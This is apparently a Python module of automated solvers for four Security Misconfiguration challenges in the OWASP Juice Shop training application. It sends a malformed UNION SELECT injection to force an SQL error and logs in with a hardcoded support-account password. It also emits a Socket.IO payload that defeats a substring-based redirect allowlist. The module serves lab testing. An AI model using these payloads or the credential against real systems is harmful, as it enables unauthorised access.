"""Security Misconfiguration category solvers (4 of 4). Verified against
routes/fileUpload.ts, routes/login.ts, routes/verify.ts,
lib/startup/registerWebsocketEvents.ts, lib/insecurity.ts, and server.ts
(fetched 2026-08-09)."""
import time

import socketio

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/fileUpload.ts handleXmlUpload/handleYamlUpload: both fire
# `challengeUtils.solveIf(deprecatedInterfaceChallenge, () => true)`
# unconditionally the moment a file ending in .xml, .yml, or .yaml is
# uploaded — no valid/parseable content required, the *interface itself*
# (accepting these formats at all) is what's "deprecated". ---

@register("deprecatedInterfaceChallenge", "Security Misconfiguration", 2)
def solve_deprecated_interface(ctx: SolverContext) -> None:
    ctx.client.post("/file-upload", files={"file": ("legacy.xml", b"<note>hi</note>", "application/xml")})


# --- routes/verify.ts errorHandlingChallenge (mounted globally as Express
# error-handling middleware, 4-arg signature — server.ts's
# `app.use(verify.errorHandlingChallenge())`): fires whenever ANY unhandled
# error reaches it with statusCode 200 or >401 — i.e. almost any genuine
# unhandled 500. Deliberately reusing the exact malformed UNION SELECT
# payload (missing the `))` needed to close routes/search.ts's doubled
# WHERE parens) that Phase 1 discovered breaks with a real SQLITE_ERROR,
# rather than crafting a new one — it's a reliable, known-bad trigger. ---

@register("errorHandlingChallenge", "Security Misconfiguration", 1)
def solve_error_handling(ctx: SolverContext) -> None:
    ctx.client.get("/rest/products/search", params={"q": "zzz' UNION SELECT invalid-- "})


# --- routes/login.ts verifyPreLoginChallenges: fires purely on request
# body match, regardless of whether the login itself succeeds. The support
# account's real password is a hardcoded literal in the source. ---

@register("loginSupportChallenge", "Security Misconfiguration", 6)
def solve_login_support(ctx: SolverContext) -> None:
    ctx.client.post("/rest/user/login", json={"email": f"support@{DOMAIN}", "password": "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P"})


# --- lib/startup/registerWebsocketEvents.ts: solved by emitting a
# `verifySvgInjectionChallenge` Socket.IO event with a string matching the
# server's regex (a path-traversal-looking prefix into a `/redirect?to=`
# URL pointing at https://cataas.com/cat). NOTE: contrary to the original
# assumption, lib/insecurity.ts's `redirectAllowlist` does NOT contain
# "cataas.com" — it only contains a handful of specific full URLs (GitHub
# repo, crypto donation addresses, spreadshirt/stickeryou/leanpub pages).
# `isRedirectAllowed()` does a plain `url.includes(allowedUrl)` substring
# check against the *entire* emitted string, and the server regex ends in
# `.*` (unbounded trailing content), so appending a real allow-listed URL
# after the required `.../redirect?to=https://cataas.com/cat` prefix
# satisfies both checks at once. ---

SVG_INJECTION_PAYLOAD = "../../../redirect?to=https://cataas.com/cat https://github.com/juice-shop/juice-shop"


@register("svgInjectionChallenge", "Security Misconfiguration", 5)
def solve_svg_injection(ctx: SolverContext) -> None:
    sio = socketio.SimpleClient()
    sio.connect(ctx.base_url, transports=["websocket"])
    try:
        sio.emit("verifySvgInjectionChallenge", SVG_INJECTION_PAYLOAD)
        time.sleep(1)
    finally:
        sio.disconnect()
